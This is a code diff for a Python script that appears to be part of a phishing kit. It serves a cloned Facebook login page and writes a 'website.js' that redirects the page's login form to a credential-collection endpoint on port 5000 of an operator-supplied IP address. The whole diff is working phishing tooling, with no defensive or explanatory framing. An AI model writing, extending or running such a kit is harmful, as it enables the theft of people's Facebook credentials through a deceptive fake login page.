@@ -1,9 +1,7 @@
 import os
 import webbrowser
 
-def change_dir(website_name):
-  os.chdir(f"Websites/{website_name}")
-
+cwd = os.getcwd()
 
 print('''
 Options:
@@ -12,8 +10,21 @@ Options:
 
 user_input = input("Choose Option: ")
 
-localip = input("Enter Your Local ipaddress: ")
+ip_address = input("Enter Ip Address: ")
 
 if user_input == "1":
-  change_dir("Facebook")
-  os.system("python3 -m http.server")
+  try:
+    webbrowser.open(f"http://{ip_address}:8000/login.html")
+
+  except:
+    pass
+
+  os.chdir(cwd + "/Websites/Facebook")
+  open("website.js", "w").write(f'''let form = document.querySelector("#input"); form.action = "http://{ip_address}:5000/facebook";''')
+
+
+  os.chdir(cwd + "/Websites/Facebook")
+  try:
+    os.system("python3 -m http.server")
+  except:
+    os.system("python -m http.server")
